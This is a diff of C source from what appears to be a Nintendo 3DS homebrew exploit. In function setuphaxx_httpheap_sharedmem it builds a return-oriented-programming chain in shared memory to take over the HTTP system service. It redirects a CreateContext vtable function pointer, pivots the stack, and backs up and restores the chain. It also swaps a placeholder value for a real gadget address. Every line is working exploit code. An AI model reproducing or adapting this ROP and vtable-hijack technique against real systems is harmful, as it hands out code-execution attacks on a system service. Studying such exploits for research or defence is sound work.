@@ -499,8 +499,12 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 
 	u32 *ropchain = (u32*)ropvmem_sharedmem;
 	u32 ropvaddr = 0x0f000000;
+
 	u32 createcontext_ropoffset = 0x400;
 	u32 createcontext_bakropoff = 0x800;
+	u32 createcontext_roplaunch_bakaddr;
+	u32 createcontext_roplaunch_baksize;
+
 	u32 ropheap = 0x0ffff000;//Main-thread stack-bottom.
 
 	//Setup the ROP-chain used by the CreateContext vtable funcptr.
@@ -508,12 +512,19 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Due to the "mov r0, r4" done previously, r0 contains the cmdbuf ptr at this point. Save that ptr @ ropheap+0x0.
 	ropgen_copyu32(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe + 24 + 12, ropheap+0x4, 0x3);//Copy the _this value for httpc_cmdhandler, from the saved r7 in the httpc_cmdhandler stackframe to ropheap+0x4.
 
-	//Backup the CreateContext ROP-chain then pivot to the main CreateContext ROP-chain.
-	ropgen_memcpy(&ropchain, &ropvaddr, 0x0f000000+createcontext_bakropoff, 0x0f000000+createcontext_ropoffset, 0x400);
+	//Copy the backup CreateContext ROP-chain to the main offset then pivot to the main CreateContext ROP-chain.
+	ropgen_memcpy(&ropchain, &ropvaddr, 0x0f000000+createcontext_ropoffset, 0x0f000000+createcontext_bakropoff, 0x400);
 	ropgen_stackpivot(&ropchain, &ropvaddr, 0x0f000000+createcontext_ropoffset);
 
-	ropchain = (u32*)&ropvmem_sharedmem[createcontext_ropoffset>>2];
+	//Create a backup of the above ROP.
+	createcontext_roplaunch_bakaddr = ropvaddr+0x100;
+	createcontext_roplaunch_baksize = ropvaddr - 0x0f000000;
+	memcpy((u32*)&ropvmem_sharedmem[(createcontext_roplaunch_bakaddr-0x0f000000)>>2], (u32*)ropvmem_sharedmem, createcontext_roplaunch_baksize);
+
+	ropchain = (u32*)&ropvmem_sharedmem[createcontext_bakropoff>>2];
 	ropvaddr = 0x0f000000+createcontext_ropoffset;
+
+	ropgen_memcpy(&ropchain, &ropvaddr, 0x0f000000, createcontext_roplaunch_bakaddr, createcontext_roplaunch_baksize);//Restore the initial CreateContext ROP using the backup.
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_CreateContext, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original sysmodule one.
 
@@ -524,7 +535,7 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	ropgen_addword(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_CREATECONTEXT);
 	ropgen_addwords(&ropchain, &ropvaddr, 0, 6 + 7);//"add sp, sp, #24" "pop {r4..sl, pc}"
 
-	ropgen_writeu32(&ropchain, &ropvaddr, /*ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC*/0x70707070, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original modified one.
+	ropgen_writeu32(&ropchain, &ropvaddr, ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC, __custom_mainservsession_vtable + 0x8, 1);//Restore the vtable funcptr back to the original modified one.
 
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_RETURN, __httpmainthread_cmdhandler_stackframe-4, 1);
 
